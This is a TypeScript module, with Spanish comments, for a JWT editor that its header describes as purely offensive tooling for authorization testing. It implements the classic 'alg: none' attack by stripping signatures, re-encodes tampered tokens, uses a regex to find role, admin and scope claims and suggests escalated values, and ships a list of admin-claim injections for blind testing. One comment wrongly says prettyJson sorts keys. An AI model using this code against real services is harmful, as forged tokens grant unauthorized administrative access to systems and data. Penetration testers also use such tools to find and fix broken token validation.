/**
 * Decodificador/codificador de JWT 100% cliente.
 *
 * No valida firmas — el objetivo es manipular tokens en pruebas de
 * autorización (alg: none, manipulación de claims, escalada de privilegios).
 *
 * Si necesitas verificar firmas con una clave conocida, usa OpenSSL o
 * jwt.io / pyjwt offline; aquí solo nos interesa el lado ofensivo:
 * tokens RAW como editor profesional.
 */

export interface DecodedJwt {
  header: Record<string, unknown>;
  payload: Record<string, unknown>;
  signature: string;
  /** Las tres partes raw del token, tal como vinieron (base64url). */
  raw: { header: string; payload: string; signature: string };
}

// ─── base64url helpers ───────────────────────────────────────────────

export function b64urlEncode(input: string): string {
  const bytes = new TextEncoder().encode(input);
  let bin = '';
  for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
  return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

export function b64urlDecode(input: string): string {
  let s = input.replace(/-/g, '+').replace(/_/g, '/');
  while (s.length % 4) s += '=';
  try {
    const bin = atob(s);
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    return new TextDecoder('utf-8', { fatal: false }).decode(bytes);
  } catch {
    return '';
  }
}

// ─── decode / encode ─────────────────────────────────────────────────

export function decodeJwt(token: string): DecodedJwt | null {
  const trimmed = token.trim();
  if (!trimmed) return null;
  const parts = trimmed.split('.');
  if (parts.length < 2 || parts.length > 3) return null;
  const [h, p, s = ''] = parts;
  try {
    const header = JSON.parse(b64urlDecode(h) || '{}');
    const payload = JSON.parse(b64urlDecode(p) || '{}');
    return {
      header,
      payload,
      signature: s,
      raw: { header: h, payload: p, signature: s },
    };
  } catch {
    return null;
  }
}

export function encodeJwt(
  header: object,
  payload: object,
  signature = ''
): string {
  const h = b64urlEncode(JSON.stringify(header));
  const p = b64urlEncode(JSON.stringify(payload));
  return `${h}.${p}.${signature}`;
}

/**
 * Re-codifica un token tras un edit JSON (header o payload), devuelve el
 * nuevo string. Mantiene la signature original (que ya no será válida —
 * eso es exactamente lo que queremos como atacante).
 */
export function reencode(
  headerJson: string,
  payloadJson: string,
  signature: string
): { token: string; error: string | null } {
  try {
    const header = JSON.parse(headerJson || '{}');
    const payload = JSON.parse(payloadJson || '{}');
    return { token: encodeJwt(header, payload, signature), error: null };
  } catch (e) {
    return { token: '', error: e instanceof Error ? e.message : 'JSON inválido' };
  }
}

// ─── attack helpers ──────────────────────────────────────────────────

/**
 * Ataque clásico "alg: none". Modifica el header a alg=none y borra la
 * signature (el back-end mal configurado aceptará el token tal cual).
 */
export function setAlgNone(decoded: DecodedJwt): {
  header: Record<string, unknown>;
  payload: Record<string, unknown>;
  signature: string;
} {
  const header = { ...decoded.header, alg: 'none' };
  return { header, payload: decoded.payload, signature: '' };
}

/**
 * Heurística: campos del payload con pinta de control de acceso. La
 * extensión "/i" en el regex captura variantes camelCase y snake_case.
 */
const PRIV_FIELD_RE =
  /^(role|roles|user[_-]?role|admin|is[_-]?admin|isAdmin|permission|permissions|scope|scopes|user[_-]?type|account[_-]?type|group|groups|level|privilege|privileges|access[_-]?level)$/i;

export interface PrivField {
  key: string;
  value: unknown;
  /** Valor "elevado" que sugerimos inyectar. */
  suggested: unknown;
}

export function scanPrivilegeFields(payload: Record<string, unknown>): PrivField[] {
  const found: PrivField[] = [];
  for (const [key, value] of Object.entries(payload)) {
    if (!PRIV_FIELD_RE.test(key)) continue;
    found.push({ key, value, suggested: suggestPrivilegeValue(key, value) });
  }
  return found;
}

function suggestPrivilegeValue(key: string, current: unknown): unknown {
  const k = key.toLowerCase();
  if (typeof current === 'boolean') return true;
  if (typeof current === 'number') return 999;
  if (Array.isArray(current)) return [...current, 'admin', 'administrator', 'superuser'];
  if (typeof current === 'string') {
    if (/admin/i.test(k)) return 'true';
    if (/role|type|level/i.test(k)) return 'admin';
    if (/scope|permission/i.test(k)) return 'admin write delete';
    return 'admin';
  }
  return 'admin';
}

/**
 * Campos comunes que conviene inyectar si el payload no trae ninguno
 * obvio. Permite al usuario probar a ciegas.
 */
export const COMMON_PRIV_INJECTIONS: Array<{ key: string; value: unknown }> = [
  { key: 'role', value: 'admin' },
  { key: 'is_admin', value: true },
  { key: 'isAdmin', value: true },
  { key: 'admin', value: true },
  { key: 'user_type', value: 'admin' },
  { key: 'scope', value: 'admin' },
  { key: 'permissions', value: ['*'] },
];

/**
 * Pretty-print de un objeto JSON con 2 espacios de indentación, garantizando
 * que las claves estén ordenadas (útil para diff visual).
 */
export function prettyJson(obj: unknown): string {
  return JSON.stringify(obj, null, 2);
}

/**
 * Devuelve los nombres de algoritmos comunes para el dropdown rápido.
 */
export const COMMON_ALGS = [
  'HS256',
  'HS384',
  'HS512',
  'RS256',
  'RS384',
  'RS512',
  'ES256',
  'ES384',
  'ES512',
  'PS256',
  'PS384',
  'PS512',
  'none',
];
